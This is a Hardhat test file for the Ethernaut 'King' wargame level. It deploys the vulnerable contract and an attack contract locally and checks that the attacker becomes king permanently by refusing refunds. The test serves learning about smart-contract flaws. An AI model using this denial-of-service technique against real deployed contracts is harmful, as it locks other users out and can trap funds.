import { loadFixture } from '@nomicfoundation/hardhat-network-helpers'
import { expect } from 'chai'
import { BigNumber, Contract, providers } from 'ethers'
import { hexlify, parseEther } from 'ethers/lib/utils'
import { ethers } from 'hardhat'

describe('King', function () {
  const deployFixture = async () => {
    const [deployer, ...signers] = await ethers.getSigners()
    const KingFactory = await ethers.getContractFactory('EthernautKing')
    const King = await KingFactory.connect(deployer).deploy({ value: parseEther("1") })
    await King.deployed()
    const AttackFactory = await ethers.getContractFactory('EthernautKingAttack')
    const Attack = await AttackFactory.connect(signers[0]).deploy()
    await Attack.deployed()
    return { King, Attack, deployer, signers }
  }

  describe('Solution', function () {
    it('breaks', async () => {
      const { King, Attack, deployer, signers } = await loadFixture(deployFixture)
      expect(await King._king()).to.equal(deployer.address)
      await signers[0].sendTransaction({ value: parseEther("2"), to: King.address, gasLimit: 5000000 })
      expect(await King._king()).to.equal(signers[0].address)
      await Attack.connect(signers[0]).attack(King.address, { value: parseEther("3"), gasLimit: 5000000 });
      expect(await King._king()).to.equal(Attack.address)
      // If attack succeeded no one can be king because king is now contract address without fallback function that can't be transferred balance.
      await expect(signers[0].sendTransaction({ value: parseEther("4"), to: King.address, gasLimit: 5000000 })).to.be.reverted
    })
  })
})
